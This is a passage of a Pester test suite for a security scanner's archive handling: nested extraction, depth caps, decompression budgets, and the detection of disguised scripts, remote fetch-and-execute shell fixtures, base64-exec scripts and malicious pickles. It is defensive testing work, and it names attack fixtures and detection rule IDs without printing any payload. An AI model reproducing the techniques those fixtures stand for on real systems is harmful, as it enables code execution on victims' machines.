#Requires -Version 7.4
<#
    Pester 5 tests for recursive archive-member dispatch (issue #31): a
    generic 'archive' unit's extracted members are classified by content
    (New-Unit, reused as-is — catches disguised scripts for free) and
    dispatched through the normal analyzer set, with findings folded back
    onto the PARENT archive under the existing 'archive!inner/path' label —
    never added as new top-level Units. Semantic containers (wheels/eggs,
    .nupkg, PyTorch .pt/.pth) are extracted the same way but are NOT
    member-dispatched; see the zero-false-coverage-warning tests below and
    the Engine.ps1 header comment for the full design.

    All offline — no network, no tool provisioning needed (ShellCheck/
    PSScriptAnalyzer's OWN pure-PowerShell pattern layers fire without their
    external tool installed, same as every other offline archive/shell/
    powershell test in this suite).
#>

BeforeAll {
    # Canonicalize $env:TEMP ONCE, for the rest of this file's run: many tests
    # below build their own staging dir directly from $env:TEMP and pass it to
    # Expand-SubmissionArchive/Invoke-ArchiveMemberDispatch, whose inner-path
    # math assumes StagingPath is a literal prefix of Get-ChildItem's FullName
    # (see Engine.ps1's Invoke-Scan fix, review follow-up 5, #5). $env:TEMP
    # resolves through an 8.3 short name on some Windows hosts (GitHub Actions
    # windows-latest runners: C:\Users\RUNNER~1\... for
    # C:\Users\runneradmin\...) -- every test in this file that built its own
    # staging dir straight from $env:TEMP inherited that mismatch
    # independently of whether Invoke-Scan's own fix was in place.
    $env:TEMP         = (Get-Item -LiteralPath $env:TEMP).FullName
    $script:Root      = Split-Path $PSScriptRoot -Parent
    . (Join-Path $Root 'src/Invoke-MediaTransferScan.ps1')
    $script:Quiet     = $true
    $script:Corpus    = Join-Path $PSScriptRoot 'fixtures/corpus'
    $script:ArcMemDir = Join-Path $script:Corpus 'archive_member'
    $script:Analyzers = Join-Path $Root 'src/analyzers'
    $script:Out       = Join-Path $env:TEMP "mts-arcmem-out-$(Get-Random)"
    New-Item -ItemType Directory -Path $script:Out -Force | Out-Null

    function script:ScanDir($RelPath, [string[]]$DisableAnalyzers = @()) {
        Invoke-Scan -Path (Join-Path $script:Corpus $RelPath) -Profile core `
            -AnalyzerDir $script:Analyzers -ReportsDir $script:Out -Mode offline `
            -DisableAnalyzers $DisableAnalyzers
    }
    function script:AllFindings($Result) {
        @($Result.Units | ForEach-Object { $_.Findings } | Where-Object { $_ })
    }
    # Archive-member File labels use the OS-native path separator (consistent
    # with GetRelativePath elsewhere in the engine — never forced to '/').
    $script:S = [IO.Path]::DirectorySeparatorChar

    # One shared baseline scan of the whole archive_member corpus (ShellCheck
    # etc. enabled, default profile) — most tests just select the unit/findings
    # they need from it. Tests needing a DIFFERENT -DisableAnalyzers or a
    # direct Invoke-ArchiveMemberDispatch call run their own scan/call.
    $script:R = Invoke-Scan -Path $script:ArcMemDir -Profile core `
        -AnalyzerDir $script:Analyzers -ReportsDir $script:Out -Mode offline
    function script:UnitOf([string]$Name) { $script:R.Units | Where-Object { $_.Name -eq $Name } }
}
AfterAll { Remove-Item $script:Out -Recurse -Force -ErrorAction SilentlyContinue }

# ─────────────────────────────────────────────────────────────────────────────
Describe 'Archive-member dispatch — unit-count and schema preservation' {
    It 'does not add extracted archive members as top-level Units' {
        # Nine fixture archives in archive_member/, several with 2+ members each —
        # the Units array must still have exactly one entry per SUBMITTED file.
        $R.Units.Count | Should -Be 9
        @($R.Units | Where-Object { $_.Name -match '\.(sh|js|py|txt|json|pkl|whl|bin)$' }).Count | Should -Be 0
    }

    It 'folds member findings onto the parent archive using the archive!inner/path label' {
        $u = UnitOf 'disguised_and_scripts.zip'
        $u | Should -Not -BeNullOrEmpty
        @($u.Findings | Where-Object { $_.File -eq "disguised_and_scripts.zip!scripts${S}tool.sh" }).Count |
            Should -BeGreaterThan 0
    }
}

Describe 'Archive-member dispatch — disguised script inside a zip' {
    It 'content-classifies payload.txt (no shebang, innocent extension) and flags the disguise' {
        $u = UnitOf 'disguised_and_scripts.zip'
        $disguise = @($u.Findings | Where-Object {
            $_.TestID -eq 'MTS-DISGUISE-002' -and $_.File -eq "disguised_and_scripts.zip!notes${S}payload.txt" })
        $disguise.Count | Should -Be 1
        $disguise[0].Severity | Should -Be 'HIGH'   # innocent .txt hiding a script — same rule as top-level disguise fixtures
    }

    It 'also flags the real remote-fetch-and-execute shell script in the same archive' {
        $u = UnitOf 'disguised_and_scripts.zip'
        @($u.Findings | Where-Object {
            $_.TestID -eq 'SHELL-REMOTE-EXEC' -and $_.File -eq "disguised_and_scripts.zip!scripts${S}tool.sh" }).Count |
            Should -BeGreaterThan 0
    }
}

Describe 'Archive-member dispatch — JS with no package.json' {
    It 'scans a .js member for risky patterns without requiring a manifest' {
        $u = UnitOf 'js_no_pkg.zip'
        $u | Should -Not -BeNullOrEmpty
        @($u.Findings | Where-Object { $_.TestID -eq 'NPM-LIFECYCLE-SCRIPT' }).Count | Should -Be 0   # no package.json exists
        @($u.Findings | Where-Object {
            $_.TestID -eq 'NPM-JS-CHILD-PROCESS' -and $_.File -eq 'js_no_pkg.zip!app.js' }).Count |
            Should -BeGreaterThan 0
    }
}

Describe 'Archive-member dispatch — nested archive within limits' {
    It 'opens and scans a nested archive''s content (two levels deep), not just flags the nesting' {
        $u = UnitOf 'two_level_nested.zip'
        $u | Should -Not -BeNullOrEmpty
        $hit = @($u.Findings | Where-Object { $_.TestID -eq 'SHELL-B64-EXEC' })
        $hit.Count | Should -Be 1
        $hit[0].File | Should -Be "two_level_nested.zip!inner.zip!deep${S}risky.sh"
    }

    It 'still flags decompression-bomb/zip-slip/symlink hazards for a NESTED extraction, not just the top level' {
        $u = UnitOf 'nested_bomb.zip'
        $bomb = @($u.Findings | Where-Object { $_.TestID -eq 'MTS-EXTRACT-BOMB' })
        $bomb.Count | Should -Be 1
        $bomb[0].File | Should -Match '^nested_bomb\.zip!inner_bomb\.zip'
    }
}

Describe 'Archive-member dispatch — depth cap and cumulative budget (direct)' {
    BeforeAll {
        $script:TestContext = [PSCustomObject]@{
            Tools = @{}; Venv = $null; Mode = 'offline'; WorkDir = $env:TEMP
            ReportsDir = $script:Out; HelperDir = ''; TimeoutSeconds = 60; AdvisoryDbDate = $null
        }
        $script:TestEnabled = @((Import-AnalyzerRegistry -AnalyzerDir $script:Analyzers) |
            Where-Object { $_.DefaultEnabled })
    }
    # Re-extracted per test, NOT once for the whole block:
    # Invoke-ArchiveMemberDispatch DELETES members it refuses on budget
    # grounds (review follow-up 5, #11 -- refused content must not stay on
    # disk uncharged), so a staging dir shared across It blocks would carry
    # one test's deletions into the next. Production never hits this: each
    # staging dir belongs to exactly one unit and is walked exactly once.
    BeforeEach {
        $script:StageOut = Join-Path $env:TEMP "mts-arcmem-stage-$(Get-Random)"
        $script:Extraction = Expand-SubmissionArchive `
            -InputFile (Join-Path $script:ArcMemDir 'no_dupes.zip') -OutputDir $script:StageOut
        $script:NestedStageOut = Join-Path $env:TEMP "mts-arcmem-nested-stage-$(Get-Random)"
        $script:NestedExtraction = Expand-SubmissionArchive `
            -InputFile (Join-Path $script:ArcMemDir 'two_level_nested.zip') -OutputDir $script:NestedStageOut
    }
    AfterEach {
        Remove-Item $script:StageOut -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item $script:NestedStageOut -Recurse -Force -ErrorAction SilentlyContinue
    }

    It 'does not open a nested archive past the depth cap' {
        $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'no_dupes.zip'; Path = 'no_dupes.zip'
                                    RelativePath = 'no_dupes.zip'; StagingPath = $script:Extraction.StagingPath }
        $budget = New-ArchiveTreeBudget
        $findings = Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $script:TestContext `
            -Enabled $script:TestEnabled -Budget $budget -Depth ($budget.MaxDepth + 1)
        @($findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-DEPTH-CAP' }).Count | Should -Be 1
        # Nothing was opened at all -- no member findings of any kind.
        @($findings | Where-Object { $_.TestID -ne 'MTS-ARCHIVE-DEPTH-CAP' }).Count | Should -Be 0
    }

    It 'stops and reports skipped members once the shared cumulative budget is exhausted' {
        $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'no_dupes.zip'; Path = 'no_dupes.zip'
                                    RelativePath = 'no_dupes.zip'; StagingPath = $script:Extraction.StagingPath }
        $budget = New-ArchiveTreeBudget
        $budget.MaxMembers = 1   # no_dupes.zip has 2 members -- only the first is processed
        $findings = Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $script:TestContext `
            -Enabled $script:TestEnabled -Budget $budget -Depth 1
        $exceeded = @($findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' })
        $exceeded.Count | Should -Be 1
        $exceeded[0].Issue | Should -Match '1 member'
        $budget.MemberCount | Should -Be 1
    }

    It 'is a SHARED budget across sibling top-level archives, not reset per archive' {
        # Two archives dispatched with the SAME $Budget object must share one
        # cumulative counter -- an attacker cannot bypass the cap by splitting
        # content across many individually-small archives. no_dupes.zip has
        # exactly 2 members, so MaxMembers=2 lets the FIRST archive exactly
        # exhaust the shared budget without tripping its own exceeded note.
        $budget = New-ArchiveTreeBudget
        $budget.MaxMembers = 2
        $unit1 = [PSCustomObject]@{ Type = 'archive'; Name = 'a.zip'; Path = 'a.zip'
                                     RelativePath = 'a.zip'; StagingPath = $script:Extraction.StagingPath }
        $unit2 = [PSCustomObject]@{ Type = 'archive'; Name = 'b.zip'; Path = 'b.zip'
                                     RelativePath = 'b.zip'; StagingPath = $script:Extraction.StagingPath }
        $f1 = Invoke-ArchiveMemberDispatch -ArchiveUnit $unit1 -Context $script:TestContext `
            -Enabled $script:TestEnabled -Budget $budget -Depth 1
        $f2 = Invoke-ArchiveMemberDispatch -ArchiveUnit $unit2 -Context $script:TestContext `
            -Enabled $script:TestEnabled -Budget $budget -Depth 1
        # First archive consumes the whole shared budget (its own 2 members);
        # the second gets NOTHING processed and its own budget-exceeded note
        # naming both of ITS members as skipped.
        @($f1 | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' }).Count | Should -Be 0
        $secondExceeded = @($f2 | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' })
        $secondExceeded.Count | Should -Be 1
        $secondExceeded[0].Issue | Should -Match '2 member'
        $budget.MemberCount | Should -Be 2   # unchanged by unit2 -- nothing more was ever counted
    }

    It 'checks the depth cap BEFORE extraction, not after (review follow-up)' {
        # two_level_nested.zip = outer.zip{inner.zip{deep/risky.sh}} -- two real
        # levels. MaxDepth=1 means recursing into inner.zip would run at depth 2,
        # over the cap. The BUG: the old code called Expand-UnitInPlace on
        # inner.zip UNCONDITIONALLY, THEN discovered the cap only once the
        # recursive Invoke-ArchiveMemberDispatch call started -- inner.zip was
        # decompressed regardless of what the finding claimed. Proof this is
        # fixed: nothing traceable to INSIDE inner.zip appears anywhere, only a
        # depth-cap note for inner.zip itself (plus its own FileHash, since the
        # FILE is still hashed -- only its extraction is skipped).
        $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'two_level_nested.zip'; Path = 'two_level_nested.zip'
                                    RelativePath = 'two_level_nested.zip'; StagingPath = $script:NestedExtraction.StagingPath }
        $budget = New-ArchiveTreeBudget
        $budget.MaxDepth = 1
        $findings = Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $script:TestContext `
            -Enabled $script:TestEnabled -Budget $budget -Depth 1

        @($findings | Where-Object {
            $_.TestID -eq 'MTS-ARCHIVE-DEPTH-CAP' -and $_.File -eq 'two_level_nested.zip!inner.zip' }).Count |
            Should -Be 1
        # Nothing about inner.zip's OWN contents (e.g. deep/risky.sh) exists anywhere.
        @($findings | Where-Object { $_.File -like 'two_level_nested.zip!inner.zip!*' }).Count | Should -Be 0
        @($findings | Where-Object { $_.TestID -eq 'SHELL-B64-EXEC' }).Count | Should -Be 0
        # The inner.zip FILE itself is still hashed -- dispatch still runs on the
        # un-extracted unit; only Expand-UnitInPlace (the extraction) is skipped.
        @($findings | Where-Object {
            $_.TestID -eq 'MTS-HASH-001' -and $_.File -eq 'two_level_nested.zip!inner.zip' }).Count |
            Should -Be 1
        # Decisive proof extraction itself never ran: BOTH the old and new code
        # produce the SAME depth-cap finding here (the old code's recursive call
        # still hits its own top-of-function guard before WALKING inner.zip's
        # members) -- the only observable difference is whether inner.zip was
        # ever decompressed at all. Expand-UnitInPlace claims a stage-dir slot
        # (NextStageIndex++) every time it runs; zero claimed slots means
        # Expand-SubmissionArchive was never called for inner.zip.
        $budget.NextStageIndex | Should -Be 0
    }

    It 'never lets ExpandedBytes exceed MaxBytes -- look-ahead, not post-hoc (review follow-up)' {
        # The BUG: the old check was `ExpandedBytes -ge MaxBytes`, evaluated
        # BEFORE adding the CURRENT member's size -- so the one member whose
        # OWN size crosses the cap was still accepted (the total only exceeded
        # the cap AFTER acceptance). Set MaxBytes to one byte less than the sum
        # of no_dupes.zip's two members combined: the old check would accept
        # both (each check ran against a total that hadn't crossed the cap
        # YET); the fix must exclude at least the second.
        $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'no_dupes.zip'; Path = 'no_dupes.zip'
                                    RelativePath = 'no_dupes.zip'; StagingPath = $script:Extraction.StagingPath }
        $totalBytes = (Get-ChildItem -LiteralPath $script:Extraction.StagingPath -Recurse -File |
            Measure-Object -Property Length -Sum).Sum
        $budget = New-ArchiveTreeBudget
        $budget.MaxBytes = $totalBytes - 1
        $findings = Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $script:TestContext `
            -Enabled $script:TestEnabled -Budget $budget -Depth 1

        $budget.ExpandedBytes | Should -BeLessOrEqual $budget.MaxBytes
        @($findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' }).Count | Should -Be 1
    }
}

Describe 'Archive-member dispatch — shared budget checked BEFORE top-level extraction (review follow-up)' {
    It 'does not extract a top-level archive once an EARLIER archive in the same scan already exhausted the shared budget' {
        # The BUG: Invoke-ArchiveMemberDispatch only throttles MEMBER processing
        # inside an ALREADY-extracted archive -- nothing previously stopped the
        # top-level scan loop from unconditionally decompressing every
        # top-level archive first. A submission of many individually-small,
        # individually-valid archives could exhaust disk before the shared
        # budget got a chance to block anything.
        #
        # Two copies of the SAME single-member archive: with MaxMembers=1,
        # whichever is processed FIRST exactly exhausts the budget (1 member,
        # no overshoot -- completes cleanly); the SECOND must be blocked before
        # Expand-UnitInPlace ever runs on it (order-independent assertions,
        # since Get-ChildItem enumeration order isn't guaranteed).
        $srcDir = Join-Path $env:TEMP "mts-p1-src-$(Get-Random)"
        New-Item -ItemType Directory -Path $srcDir -Force | Out-Null
        Copy-Item (Join-Path $script:ArcMemDir 'shell_only.zip') (Join-Path $srcDir 'first.zip')
        Copy-Item (Join-Path $script:ArcMemDir 'shell_only.zip') (Join-Path $srcDir 'second.zip')
        $out2 = Join-Path $env:TEMP "mts-p1-out-$(Get-Random)"
        New-Item -ItemType Directory -Path $out2 -Force | Out-Null
        $origMaxMembers = $script:ArchiveTreeMaxMembers
        try {
            $script:ArchiveTreeMaxMembers = 1
            $r2 = Invoke-Scan -Path $srcDir -Profile core `
                -AnalyzerDir $script:Analyzers -ReportsDir $out2 -Mode offline

            $opened  = @($r2.Units | Where-Object { @($_.Findings | Where-Object { $_.File -match '!' }).Count -gt 0 })
            $blocked = @($r2.Units | Where-Object { @($_.Findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' }).Count -gt 0 })

            $opened.Count  | Should -Be 1
            $blocked.Count | Should -Be 1
            $opened[0].Name | Should -Not -Be $blocked[0].Name

            # The blocked archive shows NO evidence its contents were ever touched.
            @($blocked[0].Findings | Where-Object { $_.File -match '!' }).Count | Should -Be 0
            $blockedFinding = @($blocked[0].Findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' })
            $blockedFinding.Count | Should -Be 1
            $blockedFinding[0].Issue | Should -Match 'not opened'
            # The top-level per-unit MTS-NO-ANALYZER check must not ALSO fire --
            # the budget-exceeded finding already explains the gap.
            @($blocked[0].Findings | Where-Object { $_.TestID -eq 'MTS-NO-ANALYZER' }).Count | Should -Be 0
        } finally {
            $script:ArchiveTreeMaxMembers = $origMaxMembers
            Remove-Item $srcDir -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item $out2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe 'Archive-member dispatch — no duplicate findings (parent vs. member pass)' {
    It 'flags the npm postinstall hook exactly once' {
        $u = UnitOf 'no_dupes.zip'
        $u | Should -Not -BeNullOrEmpty
        @($u.Findings | Where-Object { $_.TestID -eq 'NPM-LIFECYCLE-SCRIPT' }).Count | Should -Be 1
    }
    It 'flags the malicious pickle exactly once' {
        $u = UnitOf 'no_dupes.zip'
        @($u.Findings | Where-Object { $_.TestID -eq 'PICKLE-REDUCE' }).Count | Should -Be 1
    }
}

Describe 'Archive-member dispatch — semantic containers are NOT member-dispatched' {
    It 'produces zero false archive-coverage warnings for wheels and notebooks' {
        # Regression guard mirrored from tests/Vba.Tests.ps1's existing pin: a
        # wheel/notebook's whole StagingPath is genuinely read by its own
        # analyzer (PythonRules/PipAudit/Bandit) -- recursing into it as an
        # 'archive' would duplicate those findings, so wheels/eggs/nupkg/
        # PyTorch .pt/.pth are extracted but never member-dispatched (Type is
        # 'python'/'nuget'/'model', never 'archive' — see Classify.ps1's
        # KnownZipContainerTypes routing).
        $out = Join-Path $env:TEMP "mts-arcmem-semantic-$(Get-Random)"
        try {
            foreach ($corpus in @('python', 'notebook')) {
                $res = Invoke-Scan -Path (Join-Path $PSScriptRoot "fixtures/corpus/$corpus") `
                    -Profile core -AnalyzerDir $script:Analyzers -ReportsDir $out -Mode offline
                @($res.Units | ForEach-Object { $_.Findings } |
                    Where-Object { $_.TestID -in @('MTS-NO-ANALYZER', 'MTS-ARCHIVE-MEMBER-UNINSPECTED') }).Count |
                    Should -Be 0 -Because "$corpus units are analyzed via their own whole-staging-tree analyzer, not member dispatch"
            }
        } finally { Remove-Item $out -Recurse -Force -ErrorAction SilentlyContinue }
    }
}

Describe 'Archive-member dispatch — disabled analyzer produces the aggregate finding' {
    It 'reports no coverage gap for a .sh member when ShellCheck is enabled (baseline)' {
        $u = UnitOf 'shell_only.zip'
        @($u.Findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-MEMBER-UNINSPECTED' }).Count | Should -Be 0
    }

    It 'produces ONE aggregate MTS-ARCHIVE-MEMBER-UNINSPECTED finding when the only analyzer for a member type is disabled' {
        # Disabling ShellCheck removes the ONLY analyzer that declares 'shell'
        # (Select-AnalyzersForUnit reacts to enable/disable dynamically, unlike
        # a static descriptor-based inference — the exact bug class issue #31
        # was split out to fix; see the issue's "why the obvious fix does not
        # work" section).
        $r2 = ScanDir 'archive_member/shell_only.zip' -DisableAnalyzers @('ShellCheck')
        $u2 = $r2.Units | Where-Object { $_.Name -eq 'shell_only.zip' }
        $gap = @($u2.Findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-MEMBER-UNINSPECTED' })
        $gap.Count | Should -Be 1
        $gap[0].Issue | Should -Match 'run\.sh'
        $gap[0].Severity | Should -Be 'INFO'
        # The top-level per-unit MTS-NO-ANALYZER check must NOT also fire on
        # the archive unit itself -- member dispatch already took over
        # coverage-gap reporting for it (see Engine.ps1).
        @($u2.Findings | Where-Object { $_.TestID -eq 'MTS-NO-ANALYZER' }).Count | Should -Be 0
    }
}

Describe 'Archive-member dispatch — staging cleanup' {
    It 'leaves no staging directory behind after a scan involving nested extraction' {
        $tempBefore = @(Get-ChildItem $env:TEMP -Directory -Filter 'mts-staging-*' -ErrorAction SilentlyContinue).Count
        ScanDir 'archive_member/two_level_nested.zip' | Out-Null
        $tempAfter = @(Get-ChildItem $env:TEMP -Directory -Filter 'mts-staging-*' -ErrorAction SilentlyContinue).Count
        $tempAfter | Should -Be $tempBefore
    }
}

# ─────────────────────────────────────────────────────────────────────────────
# Second Codex review on PR #37 (commit 33b12f6): four more real bugs, all in
# budget/depth enforcement. Each block below targets exactly one.
# ─────────────────────────────────────────────────────────────────────────────

Describe 'Archive-tree budget — look-ahead estimate, not exhaustion-only (review follow-up 2, #1)' {
    # The BUG: the top-level precheck only blocked once the budget was ALREADY
    # at/over the cap. An archive bigger than the REMAINING headroom, but
    # smaller than the cap itself, sailed through every time -- there was
    # always SOME headroom left right up until that archive's own extraction
    # filled it. Get-ArchiveExpansionEstimate/Test-ArchiveWouldExceedBudget did
    # not exist in the pre-fix code, so these tests can't even resolve against
    # it -- a strong regression guard on their own.
    It 'estimates a real ZIP''s uncompressed size and entry count without extracting it' {
        $estimate = Get-ArchiveExpansionEstimate -Path (Join-Path $script:ArcMemDir 'no_dupes.zip')
        $estimate | Should -Not -BeNullOrEmpty
        $estimate.Count | Should -Be 2
        $estimate.Bytes | Should -BeGreaterThan 0
    }

    It 'returns $null for a tarball -- no cheap central-directory-style index exists' {
        $estimate = Get-ArchiveExpansionEstimate -Path (Join-Path $script:Corpus 'npm/tarball/evil_pkg-1.0.0.tgz')
        $estimate | Should -BeNullOrEmpty
    }

    It 'blocks an archive whose estimated size exceeds remaining headroom even though the budget is NOT yet exhausted' {
        $path = Join-Path $script:ArcMemDir 'no_dupes.zip'
        $estimate = Get-ArchiveExpansionEstimate -Path $path
        $budget = New-ArchiveTreeBudget
        $budget.ExpandedBytes = $budget.MaxBytes - $estimate.Bytes + 1   # one byte short of enough room
        Test-ArchiveWouldExceedBudget -Path $path -Budget $budget | Should -BeTrue
        # Sanity: NOT exhausted by the old, buggy exhaustion-only definition.
        $budget.ExpandedBytes | Should -BeLessThan $budget.MaxBytes
    }

    It 'allows an archive that DOES fit in remaining headroom' {
        $path = Join-Path $script:ArcMemDir 'no_dupes.zip'
        Test-ArchiveWouldExceedBudget -Path $path -Budget (New-ArchiveTreeBudget) | Should -BeFalse
    }

    It 'falls back to the safe-headroom threshold when no estimate is feasible (tarball)' {
        $path = Join-Path $script:Corpus 'npm/tarball/evil_pkg-1.0.0.tgz'
        $tightBudget = New-ArchiveTreeBudget
        $tightBudget.ExpandedBytes = $tightBudget.MaxBytes - 1MB   # 1MB headroom, below the 10MB safe threshold
        Test-ArchiveWouldExceedBudget -Path $path -Budget $tightBudget | Should -BeTrue

        $roomyBudget = New-ArchiveTreeBudget   # full headroom
        Test-ArchiveWouldExceedBudget -Path $path -Budget $roomyBudget | Should -BeFalse
    }

    It 'blocks a top-level archive via a real Invoke-Scan run once it would exceed remaining headroom' {
        $estimate = Get-ArchiveExpansionEstimate -Path (Join-Path $script:ArcMemDir 'no_dupes.zip')
        $srcDir = Join-Path $env:TEMP "mts-p4r1-src-$(Get-Random)"
        New-Item -ItemType Directory -Path $srcDir -Force | Out-Null
        Copy-Item (Join-Path $script:ArcMemDir 'no_dupes.zip') (Join-Path $srcDir 'first.zip')
        Copy-Item (Join-Path $script:ArcMemDir 'no_dupes.zip') (Join-Path $srcDir 'second.zip')
        $out2 = Join-Path $env:TEMP "mts-p4r1-out-$(Get-Random)"
        New-Item -ItemType Directory -Path $out2 -Force | Out-Null
        $origMaxBytes = $script:ArchiveTreeMaxBytes
        try {
            # Room for one archive's real expansion plus a sliver -- not two.
            $script:ArchiveTreeMaxBytes = $estimate.Bytes + 100
            $r2 = Invoke-Scan -Path $srcDir -Profile core `
                -AnalyzerDir $script:Analyzers -ReportsDir $out2 -Mode offline
            $opened  = @($r2.Units | Where-Object { @($_.Findings | Where-Object { $_.File -match '!' }).Count -gt 0 })
            $blocked = @($r2.Units | Where-Object { @($_.Findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' }).Count -gt 0 })
            $opened.Count  | Should -Be 1
            $blocked.Count | Should -Be 1
        } finally {
            $script:ArchiveTreeMaxBytes = $origMaxBytes
            Remove-Item $srcDir, $out2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe 'Archive-member dispatch — semantic container bytes charged to shared budget (review follow-up 2, #2)' {
    BeforeAll {
        $script:WheelStage = Join-Path $env:TEMP "mts-p4r2-stage-$(Get-Random)"
        $script:WheelExtraction = Expand-SubmissionArchive `
            -InputFile (Join-Path $script:ArcMemDir 'nested_wheel.zip') -OutputDir $script:WheelStage
        $script:WheelTestContext = [PSCustomObject]@{
            Tools = @{}; Venv = $null; Mode = 'offline'; WorkDir = (Join-Path $env:TEMP "mts-p4r2-work-$(Get-Random)")
            ReportsDir = $script:Out; HelperDir = ''; TimeoutSeconds = 60; AdvisoryDbDate = $null
        }
        New-Item -ItemType Directory -Path $script:WheelTestContext.WorkDir -Force | Out-Null
        $script:WheelTestEnabled = @((Import-AnalyzerRegistry -AnalyzerDir $script:Analyzers) |
            Where-Object { $_.DefaultEnabled })
    }
    AfterAll {
        Remove-Item $script:WheelStage -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item $script:WheelTestContext.WorkDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    It 'charges the wheel''s REAL expanded size, not just its compressed size, to the shared budget' {
        # BUG: a wheel found as a member is extracted (its own whole-tree
        # analyzer needs StagingPath) but never recursed into (semantic
        # container) -- so its per-member pre-charge (the compressed .whl
        # FILE'S own size, as it sat inside the parent zip) was the only
        # thing ever counted. Its actual, potentially much larger extracted
        # contents were invisible to the budget entirely.
        $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'nested_wheel.zip'; Path = 'nested_wheel.zip'
                                    RelativePath = 'nested_wheel.zip'; StagingPath = $script:WheelExtraction.StagingPath }
        $budget = New-ArchiveTreeBudget
        Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $script:WheelTestContext `
            -Enabled $script:WheelTestEnabled -Budget $budget -Depth 1 | Out-Null

        $compressedWheelSize = (Get-ChildItem -LiteralPath $script:WheelExtraction.StagingPath -Recurse -File |
            Select-Object -First 1).Length
        # The wheel's OWN extracted staging dir (unit1_bundled.whl -- this
        # test's dispatch call is the only extraction that happens).
        $wheelStageDir = Join-Path $script:WheelTestContext.WorkDir 'unit1_bundled.whl'
        Test-Path -LiteralPath $wheelStageDir -PathType Container | Should -BeTrue
        $realExpanded = (Get-ChildItem -LiteralPath $wheelStageDir -Recurse -File |
            Measure-Object -Property Length -Sum).Sum

        # Charged total = compressed pre-charge + the wheel's real expanded
        # content -- strictly more than the compressed size alone, which is
        # what the pre-fix code left the budget at.
        $budget.ExpandedBytes | Should -BeGreaterThan $compressedWheelSize
        $budget.ExpandedBytes | Should -Be ($compressedWheelSize + $realExpanded)
    }
}

Describe 'Archive-member dispatch — model-extension coverage restored (review follow-up 2, #3)' {
    It 'catches a malicious pickle stored under .bin, not just .pkl' {
        # BUG: PickleOpcodeScan's OLD whole-archive walk covered .bin/.h5/
        # .hdf5/.pb/.onnx/.npy/.npz; removing that walk (member dispatch made
        # it redundant) silently dropped these extensions, since Classify.ps1
        # never routed them to 'model' -- they became 'unsupported' and only
        # got an aggregate MTS-ARCHIVE-MEMBER-UNINSPECTED notice instead of
        # being scanned at all.
        $u = UnitOf 'malicious_bin.zip'
        $u | Should -Not -BeNullOrEmpty
        $reduce = @($u.Findings | Where-Object {
            $_.TestID -eq 'PICKLE-REDUCE' -and $_.File -eq 'malicious_bin.zip!model.bin' })
        $reduce.Count | Should -Be 1
        # Must not ALSO read as "no coverage" for the same member.
        @($u.Findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-MEMBER-UNINSPECTED' }).Count | Should -Be 0
    }

    It 'classifies each model-adjacent extension as model type directly (Classify.ps1)' {
        $tmpDir = Join-Path $env:TEMP "mts-p4r3-$(Get-Random)"
        New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
        try {
            foreach ($ext in @('.bin', '.h5', '.hdf5', '.pb', '.onnx', '.npy', '.npz')) {
                $f = Join-Path $tmpDir "sample$ext"
                Set-Content -LiteralPath $f -Value 'not a real model, just bytes' -NoNewline
                $classified = New-Unit -File (Get-Item $f) -ScanRoot $tmpDir
                $classified.Unit.Type | Should -Be 'model' -Because "$ext should classify as model"
            }
        } finally { Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue }
    }
}

Describe 'Archive-member dispatch — budget gate never blocks semantic containers (review follow-up 2, #4)' {
    It 'still extracts a top-level wheel even when the shared budget starts fully exhausted' {
        # BUG: the top-level precheck gated on Test-IsArchiveUnit, which also
        # matches .whl/.egg/.nupkg -- so once an EARLIER, unrelated generic
        # archive exhausted the shared budget, a semantic container was
        # blocked from extracting too, even though it's never member-
        # dispatched and doesn't consume this budget at all. That broke
        # PythonRules/PipAudit (StagingPath never set) and NuGet .nuspec
        # parsing for every submission after the first exhausting archive.
        $srcDir = Join-Path $env:TEMP "mts-p4r4-src-$(Get-Random)"
        New-Item -ItemType Directory -Path $srcDir -Force | Out-Null
        Copy-Item (Join-Path $script:Root 'tests/fixtures/corpus/python/clean_pkg-1.0-py3-none-any.whl') $srcDir
        $out2 = Join-Path $env:TEMP "mts-p4r4-out-$(Get-Random)"
        New-Item -ItemType Directory -Path $out2 -Force | Out-Null
        $origMaxMembers = $script:ArchiveTreeMaxMembers
        $origMaxBytes   = $script:ArchiveTreeMaxBytes
        try {
            $script:ArchiveTreeMaxMembers = 0   # budget starts pre-exhausted, before ANY unit is processed
            $script:ArchiveTreeMaxBytes   = 0
            $r2 = Invoke-Scan -Path $srcDir -Profile core `
                -AnalyzerDir $script:Analyzers -ReportsDir $out2 -Mode offline

            $wheelUnit = $r2.Units | Where-Object { $_.Name -like '*.whl' }
            $wheelUnit | Should -Not -BeNullOrEmpty
            $wheelUnit.Type | Should -Be 'python'
            @($wheelUnit.Findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' }).Count | Should -Be 0
            # Decisive proof extraction actually happened: PipAudit early-
